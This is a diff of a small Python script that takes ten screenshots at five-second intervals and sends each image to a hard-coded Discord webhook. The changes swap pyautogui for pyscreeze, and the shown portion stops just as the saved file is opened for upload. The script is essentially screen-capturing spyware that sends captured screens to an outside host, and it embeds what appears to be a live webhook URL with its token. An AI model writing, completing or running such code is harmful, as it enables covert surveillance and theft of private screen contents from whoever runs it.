@@ -1,7 +1,6 @@
-import pyautogui
-from time import sleep
+import pyscreeze
+import time
 import requests
-
 
 # YOUR DISCORD WEBHOOK
 discord_webhook = "https://discordapp.com/api/webhooks/1162112306231132240/45HVmxFo-2XQ57FTrjfLw2AWSfs1146Dq5E0CMg2gltx4hTlZQCXjjO6OQsVOURf85Na"
@@ -11,10 +10,10 @@ SCREENSHOTS = 10
 TIMING = 5
 
 for i in range(SCREENSHOTS):
-    sleep(TIMING)
+    time.sleep(TIMING)
 
     # take the screenshot
-    screenshot = pyautogui.screenshot()
+    screenshot = pyscreeze.screenshot()
     screenshot.save("screenshot.png")
 
     with open("screenshot.png", "rb") as f:
